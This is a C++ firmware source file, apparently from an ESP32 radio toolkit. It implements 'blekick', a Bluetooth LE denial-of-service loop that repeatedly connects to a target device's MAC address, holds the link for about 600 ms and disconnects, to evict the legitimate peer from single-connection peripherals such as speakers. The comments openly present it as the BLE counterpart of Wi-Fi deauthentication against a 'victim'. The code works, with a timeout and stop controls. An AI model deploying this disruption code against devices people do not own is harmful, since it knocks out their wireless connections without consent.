// BLE kick ("blekick"): the deauth equivalent for BLE. We become a NimBLE *central* for one target MAC and
// loop connect -> hold ~600 ms -> disconnect with status 0x13 ("Remote User Terminated Connection"). For a
// single-connection-slot peripheral (a beach speaker playing from its phone) that evicts or stutters the real
// peer. Loops until stopped by "blekick 0" or the dead-man's switch - deliberately mirroring Wi-Fi deauth in
// everything else (stop on mode change, not persisted, red LED blink while active). The connection-takeover
// family is chosen because it is doable with stock NimBLE host APIs on this core: no raw PDU injection and no
// GATT/L2CAP client. BLE-mode only - the victim must be advertising (we resolve its address type from the table).
#include "bandwatch_core.h"

#include <BLEDevice.h>          // brings up the NimBLE host (same as ble_scan.cpp)
#include <host/ble_gap.h>       // ble_gap_connect / ble_gap_terminate + the gap event callback types
#include <nimble/hci_common.h>  // ble_addr_t, BLE_OWN_ADDR_*

BleKick bleKick;   // type in bandwatch_core.h

namespace {   // kick internals; serviceBleKick() breaks out below to be reachable from uiTimerCb

// "Remote User Terminated Connection". This port's enum calls it BLE_ERR_REM_USER_CONN_TERM
// (include/nimble/ble.h); we keep the spec value as a named local constant so the reason is visible here.
// btlejack's passive jam injects the same code, which is prior art for the *value* if not the mechanism.
constexpr uint8_t kKickReason = 0x13;

// GAP connect callback. Runs on the NimBLE host task - the same single-producer discipline as bleGapEvent():
// mutate shared fields only under g_devMux, keep heap/Serial out of the lock, print after releasing it.
// Returns int (ble_gap_event_fn); 0 is "handled", like bleGapEvent().
int bleKickEventCb(struct ble_gap_event* event, void* arg) {
    (void)arg;
    const uint32_t now = millis();
    if (event->type == BLE_GAP_EVENT_CONNECT) {
        if (event->connect.status == 0) {   // won the connection - the moment of impact
            portENTER_CRITICAL(&g_devMux);
            bleKick.connh = event->connect.conn_handle;
            bleKick.kicks = bleKick.kicks + 1;
            bleKick.st = 2;
            bleKick.stateMs = now;
            const uint32_t n = bleKick.kicks;
            portEXIT_CRITICAL(&g_devMux);
            if (serialRoom(64))
                Serial.printf("{\"t\":\"log\",\"msg\":\"blekick #%lu connected\"}\n", static_cast<unsigned long>(n));
        } else {   // refused or timed out
            portENTER_CRITICAL(&g_devMux);
            const bool wasConnecting = bleKick.st == 1;
            if (wasConnecting) { bleKick.fails = bleKick.fails + 1; bleKick.st = 0; bleKick.stateMs = now; }
            const uint32_t n = bleKick.fails;
            portEXIT_CRITICAL(&g_devMux);
            // Throttle: the first refusal plus every 16th, so a busy victim that refuses forever is visible but not spammy.
            if (wasConnecting && serialRoom(80) && (n == 1 || (n & 15u) == 0))
                Serial.printf("{\"t\":\"log\",\"msg\":\"blekick attempt failed rc=%d (%lu total)\"}\n",
                              event->connect.status, static_cast<unsigned long>(n));
        }
    } else if (event->type == BLE_GAP_EVENT_DISCONNECT) {
        // Act only for the connection we own and only while connected: a stop mid-connected already set st=0.
        portENTER_CRITICAL(&g_devMux);
        const bool ours = bleKick.st == 2 && event->disconnect.conn.conn_handle == bleKick.connh;
        if (ours) { bleKick.st = 0; bleKick.stateMs = now; }
        portEXIT_CRITICAL(&g_devMux);
    }
    return 0;   // handled, like bleGapEvent()
}

} // namespace

// Start the kick loop for one target. Loop task, called from handleCommand(). The MAC is MSB-first (table order).
void startBleKick(const uint8_t* mac) {
    portENTER_CRITICAL(&g_devMux);
    memcpy(bleKick.mac, mac, 6);
    // Resolve the peer address type from a still-fresh table entry; default to random if evicted or never seen
    // (most kick targets use a static random address). bleDevs is protected by this same lock.
    uint8_t addrType = BLE_ADDR_RANDOM;
    for (int i = 0; i < kBleDevSlots; i++) {
        const BleDev& d = bleDevs[i];
        if (d.lastMs && macEq(d.mac, mac)) { addrType = d.addrType ? BLE_ADDR_RANDOM : BLE_ADDR_PUBLIC; break; }
    }
    bleKick.addrType = addrType;
    bleKick.kicks = 0;
    bleKick.fails = 0;
    bleKick.st = 0;
    const uint32_t now = millis();
    bleKick.startMs = now;   // dead-man's switch origin (kDeauthMaxMs, like deauth)
    bleKick.stateMs = now;   // pacing: the first gap runs from here
    bleKick.active = true;   // last: serviceBleKick() reads it to decide whether to run at all
    portEXIT_CRITICAL(&g_devMux);
}

// Stop the kick loop. Loop task (handleCommand / setBandMode). Clears only `active`: a held slot (st == 2) is left
// for serviceBleKick() to terminate promptly, and a pending CONNECT either fires its callback against the state
// guards above or dies with the host when a mode change deinits it.
void stopBleKick() {
    if (!bleKick.active) return;
    portENTER_CRITICAL(&g_devMux);
    bleKick.active = false;
    portEXIT_CRITICAL(&g_devMux);
}

// Pace the kick state machine, called from uiTimerCb() (loop task) at ~120 ms cadence - plenty for 600/700 ms.
void serviceBleKick() {
    if (!bleKick.active) {
        // A stop mid-connected must not hold the victim's slot until its supervision timeout: terminate once, then idle.
        // Only while the host is up - a mode change already deinited it and took any live connection with it.
        portENTER_CRITICAL(&g_devMux);
        const bool connected = bleKick.st == 2;
        const uint16_t connh = bleKick.connh;
        if (connected) bleKick.st = 0;   // mark idle so a late DISCONNECT event does not re-park stateMs
        portEXIT_CRITICAL(&g_devMux);
        if (connected && bandMode == BAND_BLE && bleScan.inited) (void)ble_gap_terminate(connh, kKickReason);
        return;
    }

    const uint32_t now = millis();
    if (now - bleKick.startMs > kDeauthMaxMs) {   // dead-man's switch: host/serial link may have dropped
        portENTER_CRITICAL(&g_devMux);
        bleKick.active = false;
        bleKick.st = 0;
        portEXIT_CRITICAL(&g_devMux);
        if (serialRoom(96))
            Serial.printf("{\"t\":\"log\",\"msg\":\"blekick auto-stopped after %lus\"}\n",
                          static_cast<unsigned long>(kDeauthMaxMs / 1000));
        return;
    }

    // Snapshot state + its timestamp together: a CONNECT landing between two unlocked reads could pair an old
    // idle with a fresh stamp and fire a second connect while the first is still pending.
    portENTER_CRITICAL(&g_devMux);
    const uint8_t st = bleKick.st;
    const uint32_t stateMs = bleKick.stateMs;
    portEXIT_CRITICAL(&g_devMux);
    if (st == 0 && now - stateMs >= kBleKickGapMs) {
        // Idle long enough: reach for the target again. Build the peer address in little-endian (.val is
        // on-air order), so reverse the MSB-first table MAC. params=NULL = stack defaults (fine at close range).
        ble_addr_t peer;
        peer.type = bleKick.addrType;
        for (int i = 0; i < 6; i++) peer.val[i] = bleKick.mac[5 - i];
        const int rc = ble_gap_connect(BLE_OWN_ADDR_PUBLIC, &peer, kBleKickTimeoutMs, nullptr, bleKickEventCb, nullptr);
        if (rc == 0) {
            portENTER_CRITICAL(&g_devMux);
            bleKick.st = 1;   // connecting; the CONNECT callback resolves it to won or failed
            bleKick.stateMs = now;
            portEXIT_CRITICAL(&g_devMux);
        } else if (serialRoom(80)) {
            Serial.printf("{\"t\":\"log\",\"msg\":\"blekick connect refused rc=%d\"}\n", rc);
        }
    } else if (st == 2 && now - stateMs >= kBleKickHoldMs) {
        // Held a won connection long enough: drop it. ENOTCONN = the peer went first; the DISCONNECT event then
        // finds st already idle and skips, so only a clean terminate needs to park stateMs here.
        portENTER_CRITICAL(&g_devMux);
        const uint16_t connh = bleKick.connh;
        portEXIT_CRITICAL(&g_devMux);
        if (ble_gap_terminate(connh, kKickReason) != 0) {
            portENTER_CRITICAL(&g_devMux);
            if (bleKick.st == 2) { bleKick.st = 0; bleKick.stateMs = now; }
            portEXIT_CRITICAL(&g_devMux);
        }
    }
}
